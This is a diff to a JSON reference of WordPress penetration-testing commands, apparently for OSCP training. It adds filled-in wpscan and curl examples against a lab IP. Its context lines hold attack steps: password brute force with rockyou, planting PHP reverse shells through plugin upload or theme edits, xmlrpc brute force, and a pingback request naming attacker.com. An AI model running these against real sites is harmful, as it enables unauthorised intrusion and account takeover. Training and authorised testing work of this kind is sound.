@@ -78,7 +78,8 @@
       "oscp_relevance": "high",
       "methodology_guidance": {
         "after_success": "searchsploit <plugin-name> searchsploit <theme-name>"
-      }
+      },
+      "filled_example": "wpscan --url http://192.168.45.100/wordpress --enumerate u,ap,at,vp,vt,cb,dbe --api-token YOUR_API_TOKEN_HERE --disable-tls-checks"
     },
     {
       "id": "wpscan-aggressive-detection",
@@ -154,7 +155,8 @@
       "methodology_guidance": {
         "after_success": "searchsploit <plugin-name> <version> searchsploit <theme-name> <version>",
         "manual_alternative": "Check plugin paths manually: curl <URL>/wp-content/plugins/<PLUGIN>/readme.txt"
-      }
+      },
+      "filled_example": "wpscan --url http://192.168.45.100/wordpress --plugins-detection aggressive --themes-detection aggressive --enumerate ap,at --api-token YOUR_API_TOKEN_HERE"
     },
     {
       "id": "wpscan-password-attack",
@@ -239,7 +241,8 @@
       "oscp_relevance": "high",
       "methodology_guidance": {
         "after_success": "Login to WordPress: navigate to <URL>/wp-admin/ with found credentials Check user role: dashboard shows capabilities (admin = full control, editor = limited) Upload plugin shell if admin: Plugins > Add New > Upload Plugin > choose PHP reverse shell as .zip Edit theme files: Appearance > Theme Editor > 404.php (add PHP reverse shell) Search for sensitive data: Posts, Pages, Users, Settings"
-      }
+      },
+      "filled_example": "wpscan --url http://192.168.45.100/wordpress --usernames admin,john,editor --passwords /usr/share/wordlists/rockyou.txt --max-threads 20"
     },
     {
       "id": "wordpress-xmlrpc-enum",
@@ -287,9 +290,17 @@
         "Parse error",
         "faultCode"
       ],
-      "prerequisites": ["wpscan-enumerate-all"],
-      "alternatives": ["wpscan-aggressive-detection"],
-      "next_steps": ["wpscan-password-attack", "searchsploit", "burp-intruder"],
+      "prerequisites": [
+        "wpscan-enumerate-all"
+      ],
+      "alternatives": [
+        "wpscan-aggressive-detection"
+      ],
+      "next_steps": [
+        "wpscan-password-attack",
+        "searchsploit",
+        "burp-intruder"
+      ],
       "troubleshooting": {
         "xmlrpc_disabled": "XML-RPC disabled (404 or error). This is good security but blocks this attack vector. Try other WordPress attacks",
         "no_methods_listed": "XML-RPC enabled but methods may be restricted. Try specific methods manually: wp.getUsersBlogs, pingback.ping",
@@ -302,7 +313,8 @@
       "methodology_guidance": {
         "after_success": "Test for pingback vulnerability: curl -X POST -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.com/</string></value></param><param><value><string>http://target.com/valid-post</string></value></param></params></methodCall>' <URL>/xmlrpc.php Brute force credentials: curl -X POST -d '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password123</value></param></params></methodCall>' <URL>/xmlrpc.php searchsploit xmlrpc Check for known CVEs: searchsploit wordpress xmlrpc",
         "time_estimate": "Use system.multicall for faster brute force (multiple attempts in one request)"
-      }
+      },
+      "filled_example": "curl -X POST -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' http://192.168.45.100/wordpress/xmlrpc.php"
     },
     {
       "id": "wordpress-manual-version",
@@ -363,7 +375,8 @@
       "oscp_relevance": "high",
       "methodology_guidance": {
         "after_success": "Check readme.html: curl -s <URL>/readme.html | grep 'Version' Check feed: curl -s <URL>/feed/ | grep 'generator' Check wp-includes: curl -I <URL>/wp-includes/js/jquery/jquery.js (version in path) Check style.css: curl -s <URL>/wp-content/themes/<THEME>/style.css | grep 'Version' Search for exploits: searchsploit wordpress <version> Check plugin versions: curl -s <URL>/wp-content/plugins/<PLUGIN>/readme.txt"
-      }
+      },
+      "filled_example": "curl -s http://192.168.45.100/wordpress | grep 'content=\"WordPress'"
     }
   ]
 }
